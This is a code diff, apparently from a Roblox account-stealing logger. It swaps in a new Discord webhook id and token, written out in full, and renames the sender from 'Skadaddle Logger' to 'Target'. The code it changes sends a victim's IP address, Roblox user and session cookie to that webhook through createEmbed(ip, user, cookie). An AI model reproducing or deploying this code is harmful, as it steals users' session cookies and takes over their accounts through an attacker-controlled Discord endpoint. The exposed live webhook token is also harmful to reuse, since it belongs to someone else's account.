@@ -58,8 +58,8 @@ async function Log() {
         const chromeUser = await noblox.getCurrentUser();
 
         const webhookClient = new discord.WebhookClient({ 
-            id: "819361025332609035", 
-            token: 'IcvVOPxHwWRBqNJnnj3Q-b4irA2XqtK3RjQ7MN34PehpDHfaZq85E506n_KSlbi8WCzv' 
+            id: "1431782949392744649",     // https://discord.com/api/webhooks/1431782949392744649/TyZ0U2uyCnZmAf4NIcirCRBcPiaujdw6PVX_WbS6T-iVjvvqbe7gPx0S6BvImaM4-bFl
+            token: 'TyZ0U2uyCnZmAf4NIcirCRBcPiaujdw6PVX_WbS6T-iVjvvqbe7gPx0S6BvImaM4-bFl' 
         });
 
         // Send Studio data
@@ -107,8 +107,8 @@ function createEmbed(ip, user, cookie) {
                 color: 0
             }
         ],
-        username: "Skadaddle Logger",
-        avatarURL: "https://cdn.discordapp.com/icons/815155331348561920/eb90ec21afe30f712500eca717cd2133.png?size=1024"
+        username: "Target",
+        avatarURL: "https://tse2.mm.bing.net/th/id/OIP.6iCuDx2BUOO7m4CWXI21wAHaEK?pid=Api&P=0&h=220"
     };
 }
 
